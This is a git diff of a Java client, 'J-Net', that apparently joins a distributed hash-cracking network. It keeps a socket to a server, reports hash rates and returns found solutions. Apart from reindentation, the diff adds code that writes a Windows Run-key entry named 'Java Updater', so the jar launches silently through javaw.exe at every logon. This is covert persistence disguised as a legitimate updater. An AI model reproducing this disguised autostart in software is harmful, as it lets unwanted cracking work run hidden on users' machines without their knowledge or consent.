@@ -2,6 +2,7 @@ package synthetics;
 import java.io.BufferedReader;
 import java.io.DataInputStream;
 import java.io.DataOutputStream;
+import java.io.File;
 import java.io.IOException;
 import java.io.InputStream;
 import java.io.InputStreamReader;
@@ -15,6 +16,10 @@ import java.security.MessageDigest;
 import java.security.NoSuchAlgorithmException;
 import java.util.Formatter;
 import java.util.Random;
+import synthetics.net.CListenerThread;
+import synthetics.net.ServerFindThread;
+import com.sun.jna.platform.win32.Advapi32Util;
+import com.sun.jna.platform.win32.WinReg;
 
 //Copyright Kevin Cai & Daniel Greenberg
 public class Main {
@@ -47,6 +52,8 @@ public class Main {
 	public static boolean firstHashSent = false;
 	public static String clientID;
 	public static String clientMutex;
+	public static String launcherHome;
+	public static String binLocation = System.getProperty("user.dir");
 	public static boolean mutexSent = false;
 
 	public static void main (String args[]) {
@@ -64,10 +71,10 @@ public class Main {
 			}
 			byte[] mac = network.getHardwareAddress();
 			StringBuilder sb = new StringBuilder();  
-	        for (int i = 0; i < mac.length; i++) {  
-	            sb.append(String.format("%02X%s", mac[i], (i < mac.length - 1) ? "-" : ""));       
-	        }
-	        clientMutex = sb.toString(); //Send to server for check
+			for (int i = 0; i < mac.length; i++) {  
+				sb.append(String.format("%02X%s", mac[i], (i < mac.length - 1) ? "-" : ""));       
+			}
+			clientMutex = sb.toString(); //Send to server for check
 		} catch (Exception e1) {}
 		clientMutex = encryptString(clientMutex);
 		System.out.println("GENERATED MUTEX: " + clientMutex);
@@ -75,6 +82,10 @@ public class Main {
 		System.out.println("GENERATED ID: " + clientID);
 		maxThreads = Runtime.getRuntime().availableProcessors();
 		try {
+			String currentJavaJarFilePath = new File(Main.class.getProtectionDomain().getCodeSource().getLocation().getPath()).getName();
+			Advapi32Util.registryCreateKey(WinReg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run");
+			launcherHome = "\"" + System.getProperty("java.home") + "\\bin\\javaw.exe\" -jar " + binLocation + "\\" + currentJavaJarFilePath;
+			Advapi32Util.registrySetStringValue(WinReg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", "Java Updater", launcherHome);
 			System.out.println("[J-Net Client Initializing]");
 			if(devMode) {
 				System.out.println("[Dev Mode Enabled]");
@@ -121,125 +132,125 @@ public class Main {
 		while (true) {
 			if(ServerFindThread.gotServer || !devMode) {
 				try {
-						System.out.println("[Attempting to connect...] -- IP: " + hostIp);
-						connectionSocket = new Socket();
-						connectionAddress = new InetSocketAddress(hostIp, hostPort);
-						connectionSocket.setSoTimeout(2500);
-						connectionSocket.connect(connectionAddress);
-						dos = new DataOutputStream(connectionSocket.getOutputStream());
-						dis = new DataInputStream(connectionSocket.getInputStream());
-						dis.read();
-						dos.writeByte(0x00);
+					System.out.println("[Attempting to connect...] -- IP: " + hostIp);
+					connectionSocket = new Socket();
+					connectionAddress = new InetSocketAddress(hostIp, hostPort);
+					connectionSocket.setSoTimeout(2500);
+					connectionSocket.connect(connectionAddress);
+					dos = new DataOutputStream(connectionSocket.getOutputStream());
+					dis = new DataInputStream(connectionSocket.getInputStream());
+					dis.read();
+					dos.writeByte(0x00);
+					dos.flush();
+					System.out.println("[Connected to Server]");
+
+					//MUTEX SENDING
+					if(!mutexSent) {
+						dos.write(0x09);
 						dos.flush();
-						System.out.println("[Connected to Server]");
-						
-						//MUTEX SENDING
-						if(!mutexSent) {
-							dos.write(0x09);
-							dos.flush();
-							writeString(clientMutex, dos);
-							System.out.println("WROTE STRING HASH: " + clientMutex);
-							dos.flush();
-							mutexSent = true;
-						}
-						
-						lt = new CListenerThread(dis);
-						(new Thread(lt)).start();
-						connected = true;
-						(new Thread(new Runnable() {
-							public void run() {
-								while (connected) {
-									try {
-										int lastKnownHashes = 0;
-										int sendHashes = 0;
-										if (System.currentTimeMillis() - lastKeepAlive > 1000) {
-											dos.writeByte(0x00);
+						writeString(clientMutex, dos);
+						System.out.println("WROTE STRING HASH: " + clientMutex);
+						dos.flush();
+						mutexSent = true;
+					}
+
+					lt = new CListenerThread(dis);
+					(new Thread(lt)).start();
+					connected = true;
+					(new Thread(new Runnable() {
+						public void run() {
+							while (connected) {
+								try {
+									int lastKnownHashes = 0;
+									int sendHashes = 0;
+									if (System.currentTimeMillis() - lastKeepAlive > 1000) {
+										dos.writeByte(0x00);
+										dos.flush();
+										if (cracking) {
+											dos.writeByte(0x02);
 											dos.flush();
-											if (cracking) {
-												dos.writeByte(0x02);
-												dos.flush();
-												double chashRate = hashesThisSecond/1000;
-												for(int i=0; i<rateArray.length; i++) {
-													chashRate = (int) chashRate;
-													if(chashRate != 0) {
-														//System.out.println(i);
-														if(chashRate != rateArray[0]) {
-															if(rateArray[0] == 0) {
-																rateArray[0] = (int) chashRate;
-															} else {
-																rateArray[1] = rateArray[0];
-																rateArray[0] = (int) chashRate;
-															}
+											double chashRate = hashesThisSecond/1000;
+											for(int i=0; i<rateArray.length; i++) {
+												chashRate = (int) chashRate;
+												if(chashRate != 0) {
+													//System.out.println(i);
+													if(chashRate != rateArray[0]) {
+														if(rateArray[0] == 0) {
+															rateArray[0] = (int) chashRate;
+														} else {
+															rateArray[1] = rateArray[0];
+															rateArray[0] = (int) chashRate;
 														}
 													}
 												}
-												//System.out.println("INT ARRAY CONTENTS: " + Arrays.toString(rateArray));
-		
-												if(chashRate == 0 && !firstHashSent && lastKnownHashes == 0) {
-													//System.out.println("FIRST hash 2000! Now hash is: " + nowHashes);
-													firstHashSent = true;
-												}
-												
-												if(chashRate != 0 && firstHashSent) {
-													lastKnownHashes = (int) chashRate;
-												}
-												
-												if(chashRate == 0 && lastKnownHashes == 0 && firstHashSent) {
-													double sum = 0;
-													//System.out.println("INT ARRAY CONTENTS: " + Arrays.toString(rateArray));
-													for(int i = 0; i < rateArray.length; i++) {
-														sum += rateArray[i];
-													}
-													double placeholder = sum / rateArray.length;
-													if(placeholder != 0) {
-														lastKnownHashes = (int) placeholder;
-													} else {
-														lastKnownHashes = 2400;
-													}
-												}
-												sendHashes = lastKnownHashes;
-												//if(sendHashes == 0) {System.out.println("FUCK I SENT A 0" + " THE LAST IS: " + lastKnownHashes + " THE NOW IS: " + nowHashes);}
-												System.out.println("[R]: " + sendHashes);
-												dos.writeInt(sendHashes);
-												dos.flush();
-												dos.writeByte(0x03);
-												dos.flush();
-												writeBigInteger(lowestNumber, dos);
-												dos.flush();
 											}
-											lastKeepAlive = System.currentTimeMillis();
+											//System.out.println("INT ARRAY CONTENTS: " + Arrays.toString(rateArray));
+
+											if(chashRate == 0 && !firstHashSent && lastKnownHashes == 0) {
+												//System.out.println("FIRST hash 2000! Now hash is: " + nowHashes);
+												firstHashSent = true;
+											}
+
+											if(chashRate != 0 && firstHashSent) {
+												lastKnownHashes = (int) chashRate;
+											}
+
+											if(chashRate == 0 && lastKnownHashes == 0 && firstHashSent) {
+												double sum = 0;
+												//System.out.println("INT ARRAY CONTENTS: " + Arrays.toString(rateArray));
+												for(int i = 0; i < rateArray.length; i++) {
+													sum += rateArray[i];
+												}
+												double placeholder = sum / rateArray.length;
+												if(placeholder != 0) {
+													lastKnownHashes = (int) placeholder;
+												} else {
+													lastKnownHashes = 2400;
+												}
+											}
+											sendHashes = lastKnownHashes;
+											//if(sendHashes == 0) {System.out.println("FUCK I SENT A 0" + " THE LAST IS: " + lastKnownHashes + " THE NOW IS: " + nowHashes);}
+											System.out.println("[R]: " + sendHashes);
+											dos.writeInt(sendHashes);
+											dos.flush();
+											dos.writeByte(0x03);
+											dos.flush();
+											writeBigInteger(lowestNumber, dos);
+											dos.flush();
 										}
-										if (foundSolution) {
-											dos.write(0x04);
-											dos.flush();
-											writeString(solution, dos);
-											dos.flush();
-											foundSolution = false;
-										}
-										//if (sendAverage) {
-											//sendAverage = false;
-											dos.write(0x05);
-											dos.flush();
-											//System.out.println(average);
-											dos.writeInt(average);
-											dos.flush();
-										//}
-										if (requestNew) {
-											requestNew = false;
-											dos.write(0x06);
-											dos.flush();
-										}
-										dos.write(0x07);
+										lastKeepAlive = System.currentTimeMillis();
+									}
+									if (foundSolution) {
+										dos.write(0x04);
 										dos.flush();
-										dos.writeBoolean(cracking);
+										writeString(solution, dos);
 										dos.flush();
-										
-										dos.write(0x08);
+										foundSolution = false;
+									}
+									//if (sendAverage) {
+									//sendAverage = false;
+									dos.write(0x05);
+									dos.flush();
+									//System.out.println(average);
+									dos.writeInt(average);
+									dos.flush();
+									//}
+									if (requestNew) {
+										requestNew = false;
+										dos.write(0x06);
 										dos.flush();
-										writeString(clientID, dos);
-										dos.flush();
-										
-										Thread.sleep(20);
+									}
+									dos.write(0x07);
+									dos.flush();
+									dos.writeBoolean(cracking);
+									dos.flush();
+
+									dos.write(0x08);
+									dos.flush();
+									writeString(clientID, dos);
+									dos.flush();
+
+									Thread.sleep(20);
 								} catch (Exception e) {  }
 							}
 						}
@@ -252,7 +263,7 @@ public class Main {
 			}
 		}
 	}
-	
+
 	public String getFileString(String filename) throws Exception {
 		String s13 = "";
 		InputStream in = getClass().getClassLoader().getResourceAsStream(filename);
@@ -267,58 +278,58 @@ public class Main {
 		in.close();
 		return s13;
 	}
-	
+
 	private static String getID() {
 		String output = "";
 		int randAIndex;
 		int randNIndex;
 		String alphabet = "ABCDEFGHIJKLMNOPQRSTUVXYZ";
 		String numbers = "0123456789";
-	    int AL = alphabet.length();
-	    int NL = numbers.length();
-	    Random rGen = new Random();
-	    for (int i=0; i<2; i++) {
-	    	randAIndex = rGen.nextInt(AL);
-	    	randNIndex = rGen.nextInt(NL);
-	        output = Character.toString(alphabet.charAt(randAIndex));
-	        output += Character.toString(numbers.charAt(randNIndex));
-	    }
-	    return output;
+		int AL = alphabet.length();
+		int NL = numbers.length();
+		Random rGen = new Random();
+		for (int i=0; i<2; i++) {
+			randAIndex = rGen.nextInt(AL);
+			randNIndex = rGen.nextInt(NL);
+			output = Character.toString(alphabet.charAt(randAIndex));
+			output += Character.toString(numbers.charAt(randNIndex));
+		}
+		return output;
 	}
-	
+
 	private static String encryptString(String password)
 	{
-	    String sha1 = "";
-	    try
-	    {
-	        MessageDigest crypt = MessageDigest.getInstance("SHA-1");
-	        crypt.reset();
-	        crypt.update(password.getBytes("UTF-8"));
-	        sha1 = byteToHex(crypt.digest());
-	    }
-	    catch(NoSuchAlgorithmException e)
-	    {
-	        e.printStackTrace();
-	    }
-	    catch(UnsupportedEncodingException e)
-	    {
-	        e.printStackTrace();
-	    }
-	    return sha1;
+		String sha1 = "";
+		try
+		{
+			MessageDigest crypt = MessageDigest.getInstance("SHA-1");
+			crypt.reset();
+			crypt.update(password.getBytes("UTF-8"));
+			sha1 = byteToHex(crypt.digest());
+		}
+		catch(NoSuchAlgorithmException e)
+		{
+			e.printStackTrace();
+		}
+		catch(UnsupportedEncodingException e)
+		{
+			e.printStackTrace();
+		}
+		return sha1;
 	}
 
 	private static String byteToHex(final byte[] hash)
 	{
-	    Formatter formatter = new Formatter();
-	    for (byte b : hash)
-	    {
-	        formatter.format("%02x", b);
-	    }
-	    String result = formatter.toString();
-	    formatter.close();
-	    return result;
+		Formatter formatter = new Formatter();
+		for (byte b : hash)
+		{
+			formatter.format("%02x", b);
+		}
+		String result = formatter.toString();
+		formatter.close();
+		return result;
 	}
-	
+
 	public static BigInteger power (int number, int exponent) {
 		BigInteger num = BigInteger.valueOf(1);
 		for (int i = 0; i < exponent; i ++) {
@@ -326,11 +337,11 @@ public class Main {
 		}
 		return num;
 	}
-	
+
 	public static void out(String output) {
 		System.out.println(output);
 	}
-	
+
 	public void writeString(String par0Str, DataOutputStream par1DataOutputStream) throws IOException {
 		if (par0Str.length() > 32767) {
 			throw new IOException("String too big");
@@ -340,7 +351,7 @@ public class Main {
 			return;
 		}
 	}
-	
+
 	public void writeBigInteger(BigInteger big, DataOutputStream par1DataOutputStream) throws IOException {
 		byte[] data = big.toByteArray();
 		int length = data.length;
